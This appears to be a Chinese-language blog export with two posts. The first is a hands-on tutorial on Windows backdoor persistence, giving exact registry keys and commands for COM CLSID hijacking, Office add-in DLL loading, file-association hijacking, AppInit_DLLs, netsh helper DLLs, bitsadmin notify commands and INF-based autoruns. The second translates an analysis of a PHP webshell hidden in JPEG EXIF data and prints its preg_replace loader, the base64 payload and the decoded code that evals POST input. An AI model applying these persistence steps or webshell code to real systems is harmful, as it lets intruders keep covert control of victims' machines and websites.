Runtime。<br>这个和CRL劫持.NET程序类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p>在%APPDATA%\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test._dl</p><p>PS：如果Installer文件夹不存在，则依次创建Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}</p><p>然后就是修改注册表了，在注册表位置为：HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\Users\qiyou\AppData\Roaming\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment</p><p>然后就是测试了，打开iexplore.exe，成功弹框</p><p>PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator</p><h3 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" title="劫持MruPidlList"></a>劫持MruPidlList</h3><p>在注册表位置为HKCU\Software\Classes\CLSID\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment</p><p>该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件</p><p>当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个explorer.exe进程再起一个进程来看一下效果</p><h3 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h3><p>Word WLL<br>把dll文件保存在%APPDATA%\Microsoft\Word\Startup，然后把后缀名改为wll<br>PS：Startup支持启动多个wll<br>打开word，成功弹框</p><h3 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h3><p>Excel dll的编写可以参考三好师傅这个项目：链接<br><a href="https://github.com/3gstudent/Add-Dll-Exports">https://github.com/3gstudent/Add-Dll-Exports</a><br>用三好师傅powershell脚本生成现成的Excel dll：<br><a href="https://github.com/3gstudent/Office-Persistence">https://github.com/3gstudent/Office-Persistence</a><br>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后再修改一下注册表，office版本对应的注册表位置如下：</p><p>office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0<br>office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0<br>office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0<br>office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0<br>office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0<br>我这里使用的2010的，所以我们要修改的是HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options，添加一个键OPEN，键值为：/R test.dll</p><p>然后打开Excel，发现成功弹出计算器</p><h3 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h3><p>用三好师傅powershell脚本生成现成的PowerPoint dll：链接<br><a href="https://github.com/3gstudent/Office-Persistence">https://github.com/3gstudent/Office-Persistence</a></p><p>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后参考前面我给出的office版本对应的注册表位置，在HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint下新建一个子项：AddIns，然后在AddIns下面新建一个子项test，新建一个键为Autoload，类型为DWORD，键值为：1；新建一个键为Path，类型为SZ，键值为我们dll文件的路径</p><p>打开PowerPoint成功弹出计算器</p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h3><p>什么是文件关联</p><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。<br>举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。<br>PS：来自百度百科<br>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联</p><p>我们可以用ftype命令显示或修改用在文件扩展名关联中的文件类型</p><p>相关注册表<br>HKEY_CURRENT_USER\Software\Classe //保存了当前用户的类注册和文件扩展名信息<br>HKEY_LOCAL_MACHINE\Software\Classe //保存了系统所有用户用户的类注册和文件扩展名信息<br>HKEY_CLASS_ROOT //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图<br>我们以.txt为例，通过文件关联来修改它默认打开的程序。<br>修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</p><h3 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h3><p>User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。</p><p>其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1</p><h3 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h3><p>netsh（全称：Network Shell） 是windows系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用netsh add helper yourdll.dll来添加拓展功能，添加了之后，在启动netsh的时候就会加载我们dll文件</p><p>添加自定义helper dll<br>我们可以使用两种方式来添加helper：<br>通过cmd添加helper</p><p>netsh add helper test.dll<br>通过注册表添加helper<br>其位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh，创建一个键，名称随便，键值为我们dll的路径</p><h3 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h3><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p>bitsadmin是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行bitsadmin /?或bitsadmin /HELP获取帮助列表。</p><p>常见的bitsadmin命令</p><p>bitsadmin /create [type] DisplayName //创建一个任务<br>bitsadmin /cancel //删除一个任务<br>bitsadmin /list /allusers /verbose //列出所有任务<br>bitsadmin /AddFile //给任务test添加一个下载文件<br>bitsadmin /SetNotifyCmdLine [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。<br>bitsadmin /Resume //激活传输队列中的新任务或挂起的任务。<br>bitsadmin /cancel //删除某个任务<br>bitsadmin /reset /allusers //删除所有任务<br>bitsadmin /complete //完成某个任务<br>下面我们来测试一下：</p><p>bitsadmin /create test<br>bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件<br>bitsadmin /SetNotifyCmdLine test cmd.exe “cmd.exe /c calc.exe”<br>bitsadmin /resume test<br>重启电脑之后任务还是存在</p><p>如果我们想让任务完成，可以执行bitsadmin /complete test，calc.exe也会复制到桌面上</p><h3 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h3><p>inf文件</p><p>INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。<br>PS：来自WIKI<br>inf文件的结构<br>想了解更多可以看一下微软的手册：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</a></p><p>DefaultInstall节（来自WIKI）<br>INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。<br>DefaultInstall节（来自微软的手册）<br>RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。下面举一个calc.inf弹计算器的例子[Version] Signature=”$CHICAGO$” AdvancedINF=2.5,”test” [DefaultInstall] RunPreSetupCommands=Command1 [Command1] C:\windows\system32\calc.exe命令行下执行：<br>rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall</p><p>后门实现：<br>在注册表HKEY_CURRENT_USER\Software\Microsoft\处依次新建子项\IEAK\GroupPolicy\PendingGPOs，然后再新建几个键，如下：<br>键：Count，类型：REG_DWORD，键值：1<br>键：Path1，类型：REG_SZ，键值：C:\Users\Administrator\Desktop\test\calc.inf //这个为我们inf文件的路径，这里以上面那个inf文件例子为例<br>键：Section1，类型：REG_SZ，键值：DefaultInstall<br>重启电脑之后成功弹出计算器<br>但是重启之后PendingGPOs该项就会被清除，需要我们重新修改注册表</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="2021/01/06/wo-de-di-yi-pian-bo-ke/"/>
      <url>2021/01/06/wo-de-di-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="一种隐藏在JPG图片EXIF中的后门"><a href="#一种隐藏在JPG图片EXIF中的后门" class="headerlink" title="一种隐藏在JPG图片EXIF中的后门"></a>一种隐藏在JPG图片EXIF中的后门</h2><p>几天前，我们研究团队的 Peter Gramantik 在一个被攻破的网站上发现一个非常有趣的后门。这个后门并没有依靠正常模式去隐藏起内容（比如 base64/gzip 编码），但是它却把自己的数据隐藏在 JPEG 图片的 EXIT 头部中了。它也使用 exif_read_data 和 preg_replace 两个 PHP 函数来读取 EXIF 头部和执行。<br>技术细节<br>这个后门可分为两部分。第一部分是 exif_read_data 函数读取图片头部，preg_replace 函数来执行内容。下面是我们在被攻破网站上发现的代码：</p><pre><code>$exif = exif_read_data(‘/homepages/clientsitepath/images/stories/food/bun.jpg’);preg_replace($exif[‘Make’],$exif[‘Model’],”);</code></pre><p>这两个函数本身是无害滴。exif_read_data 函数常用来读取图片，preg_replace 函数是替代字符内容。不过，preg_replace 函数函数有个隐藏并微妙的选项，如果你传入 “/e”，它会执行 eval() 中的内容，就不是去查询/替代了。<br>所以我们在查看 bun.jpg 文件时，发现后门的第二部分：</p><pre><code>ÿØÿà^@^PJFIF^@^A^B^@^@d^@d^@^@ÿá^@¡Exif^@^@II*^@^H^@^@^@^B^@^O^A^B^@^F^@^@^@&amp;^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^@ eval ( base64_decode(“aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=’));@ÿì^@^QDucky^@^A^@^D^@^@^@&lt;^@^@ÿî^@^NAdobe^</code></pre><p>这个文件用以常见的头部开始，但是在 ”make” 头部中混入了奇怪的关键字 ”/.*/e” 。有了这个执行修饰符， preg_replace 会执行 eval() 中传入的任意内容。<br>事情变得开始有趣了……<br>如果咱们继续来看看 EXIF 数据，我们能发现， “eval ( base64_decode”隐藏在 ”Model“ 头部。把这些放在一起看，咱们就知道怎么回事了。攻击者是从 EXIF 中读取 Make 和 Model 头部信息，然后传入到 preg_replace 函数。只要我们修改 $exif[‘Make’] 和 $exif[‘Model’] ，就得到了最终的后门。</p><pre><code>preg_replace (“/.*/e”, ,”@ eval ( base64_decode(“aWYgKGl …”);</code></pre><p>解码后我们可以看到是执行 $_POST[“zz1”] 提供的内容。完整解码后的后面在这里。</p><pre><code>if (isset( $_POST[“zz1”])) &#123; eval (stripslashes( $_POST[“zz1”]..</code></pre><p>隐藏恶意软件<br>另外一个有意思的是，虽然 bun.jpg 和其他图片文件被修改了，但然后能加载并正常工作。实际上，在这些被攻破的站点，攻击者修改了站点上一个合法并之前就存在的图片。这是一种奇特的隐藏恶意软件的方法。<br>原文出处：<a href="http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
